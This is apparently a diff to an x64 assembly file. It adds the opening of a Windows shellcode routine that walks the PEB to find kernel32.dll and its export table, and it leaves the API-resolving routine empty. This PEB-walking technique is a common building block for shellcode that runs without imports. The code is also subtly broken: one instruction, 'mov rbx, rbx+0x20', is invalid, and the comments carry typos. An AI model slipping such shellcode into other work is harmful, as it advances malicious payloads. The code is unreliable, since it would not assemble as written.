@@ -1,5 +1,60 @@
 [bits 64]
 
+; Access PEB structure
+xor rbx, rbx
+mov rbx, gs:[0x60]      ; RBX = address of PEB struct
+mov rbx, [rbx+0x18]     ; RBX = address of PEB_LDR_DATA
+mov rbx, rbx+0x20       ; RBX = address of InMemoryOrderModuleList
+
+; Go down the double-link list of PEB_LDR_DATA 
+mov rbx, [rbx]          ; RBX = 1st entry in InMemoryOrderModuleList (ntdll.dll)
+mov rbx, [rbx]          ; RBX = 2st entry in InMemoryOrderModuleList (kernelbase.dll)
+mov rbx, [rbx]          ; RBX = 3st entry in InMemoryOrderModuleList (kernel32.dll)
+
+; Get VA address of kernel32.dll
+mov rbx, [rbx+0x20]     ; RBX = PEB_LDR_DATA.DllBase (address of kernel32.dll)
+mov r8, rbx             ; R8  = RBX (address of kernel32.dll)
+
+; Get VA address of ExportTable (kernel32.dll)
+mov ebx, [rbx+0x3c]     ; RBX = IMAGE_DOS_HEADER.e_lfanew (PE hdrs offset)
+add rbx, r8             ; RBX = &kernel32.dll + PeHeaders offset = &PeHeaders
+
+xor rcx, rcx
+add cx, 0x88            ; RCX = 0x88 (offset of ExportTable RVA)
+add rbx, [rbx+rcx]      ; RBX = &PeHeaders + offset of ExportTable RVA = ExportTable RVA
+add rbx, r8             ; RBX = ExportTable RVA + &kernel32.dll = &ExportTable
+mov r9, rbx             ; R9  = &ExportTable
+
+; Get VA address of ExportTable.AddressOfFunctions
+xor r10, r10
+mov r10, [r9+0x1c]      ; R10 = ExportTable.AddressOfFunctions RVA
+add r10, r8             ; R10 = &kernel32.dll + RVA = &AddressOfFunctions
+
+; Get VA address of ExportTable.AddressOfNames
+xor r11, r11
+mov r11, [r9+0x20]      ; R11 = ExportTable.AddressOfNames RVA
+add r11, r8             ; R11 = &kernel32.dll + RVA = &AddressOfNames
+
+; Get VA address of ExportTable.AddressOfNameOrdinals
+xor r12, r12
+mov r12, [r9+0x24]      ; R12 = ExportTable.AddressOfNameOrdinals RVA
+add r12, r8             ; R12 = &kernel32.dll + RVA = &AddressOfNameOrdinals
+
+jmp short get_winapi_func
+
+get_winapi_func:
+    ; Requirements:
+    ;   R8  = &kernel32.dll
+    ;   R10 = &AddressOfFunctions (ExportTable)
+    ;   R11 = &AddressOfNames (ExportTable)
+    ;   R12 = &AddressOfNameOrdinals (ExportTable)
+    ; Returns:
+    ;   RAX = &winapi_func
+
+
+
+; ==================================
+
 xor rdi, rdi            ; RDI = 0x0
 mul rdi                 ; RAX&RDX =0x0
 mov rbx, gs:[rax+0x60]  ; RBX = Address_of_PEB
